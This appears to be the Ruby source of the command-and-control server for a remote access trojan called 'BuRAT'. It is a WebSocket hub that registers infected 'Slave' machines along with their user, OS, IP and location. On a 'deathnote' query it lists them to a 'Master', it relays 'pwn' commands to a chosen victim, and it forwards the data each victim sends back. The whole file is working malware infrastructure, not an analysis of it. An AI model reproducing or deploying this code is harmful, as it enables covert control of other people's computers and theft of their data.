require 'faye/websocket'
require 'json'

require_relative 'lib/client'
require_relative 'lib/client_inator'
require_relative 'lib/pipe_inator'

module BuRAT
  class WebSocketServer
    KEEPALIVE_TIME = 15 # in seconds

    def initialize(app)
      @app     = app
      @clients = []
      @pipe_inator = PipeInator.new()
    end

    def call(env)
      if Faye::WebSocket.websocket?(env)
        ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })

        # OPEN
        ws.on :open do |event|

        end

        # MESSAGE
        ws.on :message do |event|
          begin
            packet = JSON.parse(event.data) # parse packet

            header = packet['header']       # header
            payload = packet['payload']     # payload
            trailer = packet['trailer']     # trailer

            p trailer                       # debug

            if header == "deathnote" then                 # deathnote
              deathnote(payload, ws)                      # payload = deathnote query
            elsif header == "identification" then         # identification
              identification(payload, ws)                 # payload = client details
            elsif header == "data" then                   # data
              data(payload, trailer)                      # payload = data from slave to master
            elsif header == "pwn" then                    # pwn
              pwn(payload, trailer)                       # payload = pwn from master to slave
            elsif header == "pipe" then                   # pipe
              pipe(payload)                               # soon...
            elsif header == 'config' then                 # config
              config(payload)                             # soon...
            end
          rescue
            #ws.send(event.data)
            #some server stuff here if error is packet is not json
          end
        end

        # CLOSE
        ws.on :close do |event|
          @clients.each do |client|
            if client.ws == ws then
              client.status = "Offline"
              client.ws = nil

              inators = []
              client.inators.each do |inator|
                inators << {'code' => inator.code, 'name' => inator.name}
              end
              client = {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}

              packet = packet('client', client, "disconnected")
              master('*', packet)
              break
            end
          end
        end

        # Return async Rack response
        ws.rack_response

      else
        @app.call(env)
      end
    end

    private

    # DEATHNOTE
    # {'header':'deathnote', 'payload':'query', 'trailer': ''}
    def deathnote(payload, ws)
      clients = []
      @clients.each do |client|
        inators = []
        client.inators.each do |inator|
          inators << {'code' => inator.code, 'name' => inator.name}
        end
        clients << {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}
      end

      header = 'deathnote'
      payload = clients
      trailer = 'deathnote'
      packet = packet(header, payload, trailer)
      ws.send(packet)
    end

    # IDENTIFICATION
    # {'header':'identification',
    #  'payload':{
    #             'id': '',
    #             'type': '',
    #             'name': '',
    #             'computer': '',
    #             'user': '',
    #             'os': '',
    #             'ip': '',
    #             'country': '',
    #             'city': '',
    #             'inators': [{'id': '', 'name': ''}, {'id': '', 'name': ''}]
    #            },
    #  'trailer': ''}
    def identification(payload, ws)
      mode = "new"

      @clients.each do |client|
        if client.id != payload['id'] then
          mode = "new"
        elsif client.id == payload['id'] then
          mode = "existing"
          break
        end
      end

      if mode == "new" then
        inators = []
        payload['inators'].each do |inator|
          inators << ClientInator.new(inator['code'], inator['name'])
        end
        client = Client.new(payload['id'], payload['type'], payload['name'], payload['computer'], payload['user'], payload['os'], payload['ip'], payload['country'], payload['city'], "Online", inators, ws)
        @clients << client

        inators = []
        client.inators.each do |inator|
          inators << {'code' => inator.code, 'name' => inator.name}
        end
        client = {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}

        header = 'client'
        payload = client
        trailer = "new client connected"
        packet = packet(header, payload, trailer)
        master('*', packet)
      elsif mode == "existing" then
        @clients.each do |client|
          if client.id == payload['id'] then
            client.type = payload['type']
            client.name = payload['name']
            client.computer = payload['computer']
            client.user = payload['user']
            client.os = payload['os']
            client.ip = payload['ip']
            client.country = payload['country']
            client.city = payload['city']
            client.status = "Online"
            inators = []
            payload['inators'].each do |inator|
              inators << ClientInator.new(inator['code'], inator['name'])
            end
            client.inators = inators
            client.ws = ws

            inators = []
            client.inators.each do |inator|
              inators << {'code' => inator.code, 'name' => inator.name}
            end
            client = {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}

            header = 'client'
            payload = client
            trailer = "connected"
            packet = packet(header, payload, trailer)
            master('*', packet)
            break
          end
        end
      end
    end

    # DATA
    # {'header': 'data', 'payload': {'client.id': '', 'inator.id': '', 'data': ''}, 'trailer': ''}
    def data(payload, trailer)
      packet = packet('data', payload, trailer)
      master('*', packet)
      # pipe data
    end

    # PWN
    # {'header': 'pwn', 'payload': {'client.id': '', 'inator.id': '', 'data': ''}, 'trailer': ''}
    def pwn(payload, trailer)
      packet = packet('pwn', payload, trailer)
      slave(payload['client.id'], packet)
    end

    #pipe
    def pipe(payload)
      p payload
    end

    #config
    def config(payload)
      p payload
    end

    #slave
    def slave(id, packet)
      if id == "*" then
        @clients.each do |client|
          if client.type == "Slave" && client.status == "Online" then
            client.ws.send(packet)
          end
        end
      else
        @clients.each do |client|
          if client.id == id && client.status == "Online" then
            client.ws.send(packet)
            break
          end
        end
      end
    end

    #master
    def master(id, packet)
      if id == "*" then
        @clients.each do |client|
          if client.type == "Master" && client.status == "Online" then
            client.ws.send(packet)
            break
          end
        end
      else
        @clients.each do |client|
          if client.id == id && client.status == "Online" then
            client.ws.send(packet)
            break
          end
        end
      end
    end

    #packet
    def packet(header, payload, trailer)
      packet = {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
    end

  end
end
